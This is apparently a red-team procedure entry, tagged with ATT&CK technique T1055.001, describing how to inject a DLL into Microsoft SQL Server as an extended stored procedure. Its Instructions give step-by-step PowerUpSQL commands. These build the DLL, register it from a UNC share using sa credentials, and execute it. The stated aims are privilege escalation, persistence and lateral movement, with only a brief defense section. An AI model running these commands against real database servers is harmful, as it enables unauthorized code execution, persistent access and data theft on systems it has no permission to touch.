---
id: 5e094f27-cdd2-4a2f-b117-52a77fae9ed7
name: mssql-server-extended-stored-procedure-dll-injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:20.305717+00:00'
updated_at: '2023-04-10T20:36:30.714417+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Process Injection|T1055 - Process Injection]]'
sub_techniques:
  - >-
    [[sub-techniques/Dynamic-link Library Injection|T1055.001 - Dynamic-link
    Library Injection]]
tags:
  - >-
    [[tags/Add the extended stored procedure and list extended stored
    procedures]]
  - '[[tags/Extended Stored Procedure]]'
  - '[[tags/MSSQL Server]]'
commands:
  - '[[commands/create-mssql-extended-stored-procedure-dll]]'
  - '[[commands/list-mssql-extended-stored-procedures]]'
  - '[[commands/load-dll-as-extended-procedure]]'
  - '[[commands/execute-extended-stored-procedure-xp-test]]'
platforms:
  - Windows
tools:
  - '[[tools/PowerUpSQL]]'
validated: true
---

# mssql-server-extended-stored-procedure-dll-injection

## Summary

This procedure demonstrates how to inject a malicious DLL into Microsoft SQL Server as an extended stored procedure, allowing arbitrary code execution within the SQL Server process context. It leverages PowerShell tools to create the DLL, load it via sp_addextendedproc, and execute it, enabling privilege escalation or persistence on Windows systems running MSSQL.

## Description

MSSQL Server Extended Stored Procedures execute in the address space of the SQL Server process, providing a vector for DLL injection. An attacker with database credentials (e.g., sa) can create a DLL containing shellcode or commands, register it as an extended procedure, and invoke it to run code at the SQL Server's privilege level. This technique bypasses some application controls and can lead to system compromise, data access, or lateral movement. It targets Windows environments with MSSQL instances and requires the PowerUpSQL module for automation.

## Requirements

1. Administrative or sa-level credentials to the target MSSQL instance.
2. Network access to the MSSQL server (default port 1433).
3. PowerUpSQL PowerShell module installed on the attacker's machine.
4. File share access or UNC path for DLL delivery (e.g., SMB share).

## Defense

- Restrict access to the MSSQL Server to only authorized users and implement least privilege for database accounts.
- Monitor for DLL injection techniques, unexpected sp_addextendedproc calls, and new extended procedures via SQL audit logs.
- Implement application whitelisting to prevent execution of unauthorized DLLs and disable extended stored procedures if not needed.
- Enable SQL Server logging for extended procedure executions and monitor for anomalous file creations or network shares.

## Objectives

1. Execute arbitrary code in the context of the SQL Server process for privilege escalation.
2. Establish persistence through a custom extended procedure.
3. Gain access to sensitive data or pivot to other systems on the network.

## Instructions

### Step 1: Create Malicious DLL

**Context**: Generate a DLL file that exports an extended procedure function containing the desired payload, such as creating a test file to verify execution.

**Command** ([[commands/create-mssql-extended-stored-procedure-dll]]):
```powershell
Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
```

> This command uses the PowerUpSQL module to compile a DLL with the specified command payload. Verify the DLL is created in the output path and can be shared via UNC (e.g., \\10.10.0.1\temp\test.dll). Expected output is minimal, confirming file creation without errors.

### Step 2: List Existing Extended Stored Procedures

**Context**: Enumerate current extended procedures to assess the environment and avoid conflicts.

**Command** ([[commands/list-mssql-extended-stored-procedures]]):
```powershell
Get-SQLStoredProcedureXP -Instance "<DBSERVERNAME\DBInstance>" -Verbose
```

> This queries the target instance for existing xp_* procedures. Replace <DBSERVERNAME\DBInstance> with the actual server (e.g., DBSERVERNAME\SQLEXPRESS). Expected output lists procedures like xp_cmdshell, confirming no prior xp_test exists.

### Step 3: Load DLL as Extended Procedure

**Context**: Register the malicious DLL on the target server using sp_addextendedproc, making it available for execution.

**Command** ([[commands/load-dll-as-extended-procedure]]):
```powershell
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
```

> This executes the SQL command to add the procedure, pointing to the UNC path of the DLL. Use valid credentials; expected output is a success message from SQL Server indicating the procedure was added without errors.

### Step 4: Execute Extended Stored Procedure

**Context**: Invoke the newly registered procedure to trigger the payload execution within the SQL Server process.

**Command** ([[commands/execute-extended-stored-procedure-xp-test]]):
```powershell
Get-SQLQuery -UserName sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Query "EXEC xp_test"
```

> This runs the xp_test procedure, executing the DLL's payload (e.g., creating test.txt on the server). Expected output depends on the payload; for the example, it may return empty or a success indicator. Verify by checking for the file on the server or re-listing procedures.
